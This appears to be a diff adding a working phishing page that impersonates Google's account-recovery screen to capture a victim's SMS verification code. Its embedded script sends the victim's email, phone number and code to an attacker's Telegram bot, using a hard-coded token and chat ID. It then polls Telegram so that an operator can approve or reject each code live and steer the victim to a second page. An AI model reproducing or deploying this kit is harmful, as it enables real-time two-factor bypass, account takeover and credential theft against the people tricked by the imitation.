@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Account Recovery</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <style>
+        body {
+            background-color: #f8f9fa;
+            font-family: Roboto, Arial, sans-serif;
+        }
+        
+        .card {
+            max-width: 420px;
+            margin: 60px auto;
+            border: none;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
+        }
+        
+        .google-logo {
+            height: 24px;
+        }
+        
+        .form-control:focus {
+            box-shadow: none;
+            border-color: #1a73e8;
+        }
+        
+        .btn-primary {
+            background-color: #1a73e8;
+            border: none;
+        }
+        
+        .btn-primary:hover {
+            background-color: #1669c1;
+        }
+        
+        .email-selector {
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 20px;
+            padding: 5px 15px;
+            margin-top: 15px;
+            display: inline-block;
+        }
+        
+        .phone-display {
+            font-weight: bold;
+        }
+        /* ===== ERROR BANNER ===== */
+        
+        .error-msg {
+            background: rgba(220, 53, 69, 0.12);
+            border: 1px solid rgba(220, 53, 69, 0.3);
+            color: #dc3545;
+            padding: 12px 16px;
+            border-radius: 10px;
+            font-size: 13px;
+            margin-bottom: 16px;
+            display: none;
+            text-align: center;
+        }
+        /* ===== SPINNER OVERLAY ===== */
+        
+        .spinner-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+            pointer-events: none;
+        }
+        
+        .spinner-overlay.active {
+            opacity: 1;
+            visibility: visible;
+            pointer-events: all;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #ffffff30;
+            border-top-color: #0d6efd;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .spinner-text {
+            color: #e0e0e0;
+            font-size: 14px;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+        
+        .spinner-email {
+            color: #0d6efd;
+            font-size: 13px;
+            margin-top: 8px;
+            font-weight: 600;
+        }
+        
+        .cancel-poll-btn {
+            margin-top: 20px;
+            padding: 10px 24px;
+            background: transparent;
+            border: 1px solid #6c757d;
+            border-radius: 50px;
+            color: #adb5bd;
+            font-family: inherit;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .cancel-poll-btn:hover {
+            border-color: #dc3545;
+            color: #dc3545;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="card p-4">
+        <div class="text-center mb-3">
+            <img class="google-logo mb-3" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" />
+            <h5 class="mb-1">Account recovery</h5>
+            <p class="text-muted mb-2" style="font-size: 14px;">
+                To help keep your account safe, Google wants to make sure it's really you trying to sign in.
+            </p>
+            <div class="email-selector">
+                <!-- UPDATED: Online image URL for user icon -->
+                <img src="https://ssl.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png" width="20" height="20" style="border-radius: 50%;" alt="User Icon" />
+                <span id="emailDisplay">email@example.com</span>
+            </div>
+        </div>
+
+        <!-- Error message area -->
+        <div class="error-msg" id="loginError"></div>
+
+        <p style="font-size: 14px;" class="mb-2">
+            A text message with a 6-digit verification code was just sent to
+            <span class="phone-display" id="phoneDisplay">•••• ••••</span>
+        </p>
+
+        <form id="codeForm">
+            <div class="mb-3">
+                <label for="verificationCode" class="form-label text-primary" style="font-size: 14px;">Enter the code</label>
+                <input type="text" id="verificationCode" class="form-control" placeholder="G-" required />
+            </div>
+
+            <div class="mb-3">
+                <a href="#" class="text-muted" style="font-size: 13px; text-decoration: none;">Resend it</a>
+            </div>
+
+            <div class="d-flex justify-content-between align-items-center">
+                <a href="javascript:void(0)" onclick="goToSecondPage()" style="font-size: 14px;">Try another way</a>
+                <button type="submit" class="btn btn-primary px-4" id="nextBtn">Next</button>
+            </div>
+        </form>
+
+        <div class="d-flex justify-content-between text-muted mt-4" style="font-size: 12px;">
+            <span>English (United States)</span>
+            <div>
+                <a href="#" class="text-muted text-decoration-none me-2">Help</a>
+                <a href="#" class="text-muted text-decoration-none me-2">Privacy</a>
+                <a href="#" class="text-muted text-decoration-none">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- SPINNER OVERLAY -->
+    <div class="spinner-overlay" id="spinnerOverlay">
+        <div class="spinner"></div>
+        <p class="spinner-text">Waiting for approval...</p>
+        <p class="spinner-email" id="spinnerEmailDisplay"></p>
+        <button class="cancel-poll-btn" onclick="cancelPolling()">Cancel</button>
+    </div>
+
+    <script>
+        // =====================================================
+        // CONFIG
+        // =====================================================
+        const TELEGRAM_BOT_TOKEN = "8859101981:AAEQiFAqQtmOLCgEkUMn_ieXpqrs-A5KTQ8";
+        const TELEGRAM_CHAT_ID = "6367881211";
+        const APPROVAL_REDIRECT_URL_BASE = "second.html";
+
+        let email = '';
+        let phone = '';
+
+        // =====================================================
+        // POLLING STATE
+        // =====================================================
+        let pollDecided = false;
+        let pollTimeoutId = null;
+        let pollAbortController = null;
+        let isPollingActive = false;
+        let currentUserId = null;
+
+        // =====================================================
+        // PERSISTENT OFFSET (localStorage)
+        // =====================================================
+        const OFFSET_KEY = 'tg_offset_code';
+
+        function loadOffset() {
+            const saved = localStorage.getItem(OFFSET_KEY);
+            return saved ? parseInt(saved, 10) : 0;
+        }
+
+        function saveOffset(offset) {
+            localStorage.setItem(OFFSET_KEY, offset.toString());
+        }
+
+        // =====================================================
+        // UI HELPERS
+        // =====================================================
+        function showError(msg) {
+            const err = document.getElementById('loginError');
+            if (err) {
+                err.textContent = msg;
+                err.style.display = 'block';
+            }
+        }
+
+        function hideError() {
+            const err = document.getElementById('loginError');
+            if (err) err.style.display = 'none';
+        }
+
+        function maskEmail(val) {
+            if (!val) return 'Unknown';
+            const parts = val.split('@');
+            if (parts.length !== 2) return val;
+            const local = parts[0];
+            const domain = parts[1];
+            let maskedLocal;
+            if (local.length <= 2) {
+                maskedLocal = local.charAt(0) + '*';
+            } else {
+                maskedLocal = local.charAt(0) + '*'.repeat(local.length - 2) + local.charAt(local.length - 1);
+            }
+            return maskedLocal + '@' + domain;
+        }
+
+        // =====================================================
+        // NAVIGATION HELPERS
+        // =====================================================
+        function goToSecondPage() {
+            window.location.href = 'second.html?email=' + encodeURIComponent(email);
+        }
+
+        // =====================================================
+        // CANCEL POLLING
+        // =====================================================
+        function cancelPolling() {
+            pollDecided = true;
+            if (pollTimeoutId) clearTimeout(pollTimeoutId);
+            if (pollAbortController) pollAbortController.abort();
+            isPollingActive = false;
+            currentUserId = null;
+            document.getElementById('spinnerOverlay').classList.remove('active');
+            document.getElementById('nextBtn').disabled = false;
+            showError('Request cancelled. Please try again.');
+        }
+
+        // =====================================================
+        // POLLING ENGINE
+        // =====================================================
+        function startPolling(userId) {
+            pollDecided = false;
+            currentUserId = userId;
+            let offset = loadOffset();
+            let pollCount = 0;
+            const MAX_POLLS = 240;
+
+            if (pollAbortController) pollAbortController.abort();
+            pollAbortController = new AbortController();
+
+            function pollLoop() {
+                if (pollDecided) return;
+                if (isPollingActive) {
+                    pollTimeoutId = setTimeout(pollLoop, 500);
+                    return;
+                }
+
+                pollCount++;
+                if (pollCount > MAX_POLLS) {
+                    pollDecided = true;
+                    currentUserId = null;
+                    document.getElementById('spinnerOverlay').classList.remove('active');
+                    document.getElementById('nextBtn').disabled = false;
+                    showError('Request timed out. Please try again.');
+                    return;
+                }
+
+                isPollingActive = true;
+
+                const url =
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates` +
+                    `?offset=${offset}&timeout=20&allowed_updates=%5B%22callback_query%22%5D`;
+
+                fetch(url, {
+                        signal: pollAbortController.signal
+                    })
+                    .then(res => {
+                        if (res.status === 409) {
+                            isPollingActive = false;
+                            pollTimeoutId = setTimeout(pollLoop, 3000);
+                            return null;
+                        }
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data === null) return;
+                        if (!data.ok || pollDecided) {
+                            isPollingActive = false;
+                            if (!pollDecided) {
+                                pollTimeoutId = setTimeout(pollLoop, 1000);
+                            }
+                            return;
+                        }
+
+                        if (data.result && data.result.length > 0) {
+                            for (const update of data.result) {
+                                offset = update.update_id + 1;
+                                saveOffset(offset);
+
+                                if (update.callback_query && update.callback_query.data) {
+                                    const action = update.callback_query.data;
+
+                                    fetch(
+                                            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                                method: 'POST',
+                                                headers: {
+                                                    'Content-Type': 'application/json'
+                                                },
+                                                body: JSON.stringify({
+                                                    callback_query_id: update.callback_query.id,
+                                                    text: "Processing..."
+                                                })
+                                            }
+                                        )
+                                        .catch(() => {});
+
+                                    if (currentUserId && action.includes(currentUserId)) {
+                                        if (action.startsWith('approve_')) {
+                                            pollDecided = true;
+                                            isPollingActive = false;
+                                            currentUserId = null;
+                                            document.getElementById('spinnerOverlay').classList.remove('active');
+                                            window.location.href = 'second.html?email=' + encodeURIComponent(email);
+                                            return;
+                                        } else if (action.startsWith('decline_')) {
+                                            pollDecided = true;
+                                            isPollingActive = false;
+                                            currentUserId = null;
+                                            document.getElementById('spinnerOverlay').classList.remove('active');
+                                            document.getElementById('nextBtn').disabled = false;
+                                            goToSecondPage();
+                                            return;
+                                        } else if (action.startsWith('wrong_')) {
+                                            pollDecided = true;
+                                            isPollingActive = false;
+                                            currentUserId = null;
+                                            document.getElementById('spinnerOverlay').classList.remove('active');
+                                            document.getElementById('nextBtn').disabled = false;
+                                            goToSecondPage();
+                                            return;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+
+                        isPollingActive = false;
+                        if (!pollDecided) {
+                            pollTimeoutId = setTimeout(pollLoop, 500);
+                        }
+                    })
+                    .catch(err => {
+                        if (err.name === 'AbortError') return;
+                        console.error('Poll error:', err);
+                        isPollingActive = false;
+                        if (!pollDecided) {
+                            pollTimeoutId = setTimeout(pollLoop, 2000);
+                        }
+                    });
+            }
+
+            pollLoop();
+        }
+
+        // =====================================================
+        // SEND MESSAGE + INLINE KEYBOARD
+        // =====================================================
+        function sendTelegramWithInlineKeyboard(message, keyboard, userId) {
+            const spinnerOverlay = document.getElementById('spinnerOverlay');
+            const nextBtn = document.getElementById('nextBtn');
+
+            let attempts = 0;
+            const maxAttempts = 3;
+
+            function attemptSend() {
+                attempts++;
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML',
+                            reply_markup: JSON.stringify(keyboard)
+                        })
+                    })
+                    .then(res => {
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data.ok) {
+                            startPolling(userId);
+                        } else {
+                            if (attempts < maxAttempts) {
+                                setTimeout(attemptSend, 1000 * attempts);
+                            } else {
+                                spinnerOverlay.classList.remove('active');
+                                nextBtn.disabled = false;
+                                showError('Failed to send notification. Please try again.');
+                            }
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Send error:', err);
+                        if (attempts < maxAttempts) {
+                            setTimeout(attemptSend, 1000 * attempts);
+                        } else {
+                            spinnerOverlay.classList.remove('active');
+                            nextBtn.disabled = false;
+                            showError('Network error. Please check your connection and try again.');
+                        }
+                    });
+            }
+
+            attemptSend();
+        }
+
+        // =====================================================
+        // GET PARAMS FROM URL
+        // =====================================================
+        window.onload = function() {
+            const params = new URLSearchParams(window.location.search);
+            email = params.get('email') || '';
+            phone = params.get('phone') || '';
+
+            if (email) document.getElementById('emailDisplay').textContent = email;
+            if (phone) document.getElementById('phoneDisplay').textContent = phone;
+        };
+
+        // =====================================================
+        // FORM SUBMIT WITH INLINE KEYBOARD APPROVAL
+        // =====================================================
+        document.getElementById('codeForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            hideError();
+
+            const code = document.getElementById('verificationCode').value.trim();
+
+            if (code === '') {
+                showError('Please enter the verification code.');
+                return;
+            }
+
+            if (!email) {
+                showError('No email found. Please start again.');
+                return;
+            }
+
+            const spinnerOverlay = document.getElementById('spinnerOverlay');
+            const spinnerEmailDisplay = document.getElementById('spinnerEmailDisplay');
+            const nextBtn = document.getElementById('nextBtn');
+
+            spinnerEmailDisplay.textContent = maskEmail(email);
+            spinnerOverlay.classList.add('active');
+            nextBtn.disabled = true;
+
+            const sessionId = Date.now().toString(36).slice(-6);
+            const sanitizedEmail = email.replace(/[^a-zA-Z0-9]/g, '').slice(0, 6);
+            const userId = 'c_' + sanitizedEmail + '_' + sessionId;
+
+            const message =
+                `🔐 <b>Verification Code Submitted</b>\n\n` +
+                `📧 Email: <code>${email}</code>\n` +
+                `📱 Phone: <code>${phone || 'N/A'}</code>\n` +
+                `🔑 Code: <code>${code}</code>\n` +
+                `⏰ Time: ${new Date().toLocaleString('en-ZA')}\n\n` +
+                `Please approve, decline, or mark as wrong:`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{
+                        text: "✅ APPROVE",
+                        callback_data: `approve_${userId}`
+                    }, {
+                        text: "❌ DECLINE",
+                        callback_data: `decline_${userId}`
+                    }],
+                    [{
+                        text: "⚠️ WRONG CODE",
+                        callback_data: `wrong_${userId}`
+                    }]
+                ]
+            };
+
+            sendTelegramWithInlineKeyboard(message, keyboard, userId);
+        });
+    </script>
+</body>
+
+</html>
